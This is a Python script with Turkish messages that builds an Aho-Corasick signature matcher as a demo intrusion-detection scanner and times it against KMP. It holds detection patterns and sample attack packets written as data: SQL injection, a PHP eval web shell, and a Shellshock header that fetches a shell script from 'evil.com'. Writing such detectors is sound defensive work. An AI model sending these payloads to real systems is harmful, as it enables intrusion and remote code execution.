import time
from collections import deque

class ACNode:
    def __init__(self):
        self.children = {}
        self.fail = None
        self.output = set()

class AhoCorasick:
    def __init__(self):
        self.root = ACNode()
        self.pattern_count = 0

    def add_pattern(self, pattern: str):
        node = self.root
        for c in pattern.lower():
            if c not in node.children:
                node.children[c] = ACNode()
            node = node.children[c]
        node.output.add(pattern)
        self.pattern_count += 1

    def build(self):
        queue = deque()
        for child in self.root.children.values():
            child.fail = self.root
            queue.append(child)

        while queue:
            u = queue.popleft()
            for c, v in u.children.items():
                f = u.fail
                while f is not None and c not in f.children:
                    f = f.fail
                v.fail = f.children[c] if (f and c in f.children) else self.root
                if v.fail is v:
                    v.fail = self.root
                v.output |= v.fail.output
                queue.append(v)

    def search(self, text: str):
        node = self.root
        results = []
        text_lower = text.lower()
        for i, c in enumerate(text_lower):
            while node is not self.root and c not in node.children:
                node = node.fail
            if c in node.children:
                node = node.children[c]
            for pattern in node.output:
                start = i - len(pattern) + 1
                results.append((start, pattern))
        return results

    def inspect_packet(self, payload: str):
        threats = self.search(payload)
        return threats

    def stats(self):
        return f"İmza sayısı: {self.pattern_count}"


def kmp_multi(text, patterns):
    """KMP ile sıralı arama — karşılaştırma için"""
    def failure(p):
        f = [0] * len(p)
        k = 0
        for i in range(1, len(p)):
            while k > 0 and p[k] != p[i]: k = f[k-1]
            if p[k] == p[i]: k += 1
            f[i] = k
        return f

    results = []
    t = text.lower()
    for pat in patterns:
        p = pat.lower()
        f = failure(p)
        q = 0
        for i, c in enumerate(t):
            while q > 0 and p[q] != c: q = f[q-1]
            if p[q] == c: q += 1
            if q == len(p):
                results.append((i - len(p) + 1, pat))
                q = f[q-1]
    return results


if __name__ == "__main__":
    print("=== Aho-Corasick IDS Paket Tarama Testi ===\n")

    exploit_signatures = [
        "SELECT",
        "UNION SELECT",
        "DROP TABLE",
        "../etc/passwd",
        "<script>",
        "cmd.exe",
        "powershell",
        "base64_decode",
        "eval(",
        "exec(",
        "WAITFOR DELAY",
        "benchmark(",
        "sleep(",
        "nc -e",
        "wget http",
    ]

    ids = AhoCorasick()
    t0 = time.perf_counter()
    for sig in exploit_signatures:
        ids.add_pattern(sig)
    ids.build()
    build_time = (time.perf_counter() - t0) * 1000

    print(f"Yasaklı kelime sayısı: {len(exploit_signatures)}")
    print(f"Otomata inşa süresi: {build_time:.3f} ms (bir kez yapılır)\n")

    test_packets = [
        "GET /search?q=1' UNION SELECT username,password FROM users--",
        "POST /upload Content: <?php eval($_POST['cmd']); ?>",
        "GET /page?id=1; WAITFOR DELAY '0:0:5'--",
        "GET /index.html HTTP/1.1 Accept: text/html",
        "User-Agent: () { :;}; wget http://evil.com/shell.sh",
        "GET /admin?cmd=powershell -enc base64_decode(payload)",
    ]

    print("--- Örnek Paket Sonuçları ---")
    for pkt in test_packets:
        threats = ids.inspect_packet(pkt)
        label = "YASAKLI" if threats else "TEMİZ  "
        found = [t[1] for t in threats]
        print(f"\nPaket : {pkt[:65]}")
        print(f"Durum : {label} | Bulunan: {found}")

    print("\n--- Performans Özeti ---")
    N = 1000
    bulk = test_packets * (N // len(test_packets))

    t0 = time.perf_counter()
    for pkt in bulk:
        ids.inspect_packet(pkt)
    ac_time = (time.perf_counter() - t0) * 1000

    t0 = time.perf_counter()
    for pkt in bulk:
        kmp_multi(pkt, exploit_signatures)
    kmp_time = (time.perf_counter() - t0) * 1000

    print(f"Aho-Corasick {N} paket : {ac_time:.3f} ms")
    print(f"KMP×{len(exploit_signatures)} toplam     : {kmp_time:.3f} ms")
    print(f"Hız farkı              : {kmp_time/ac_time:.1f}x daha hızlı")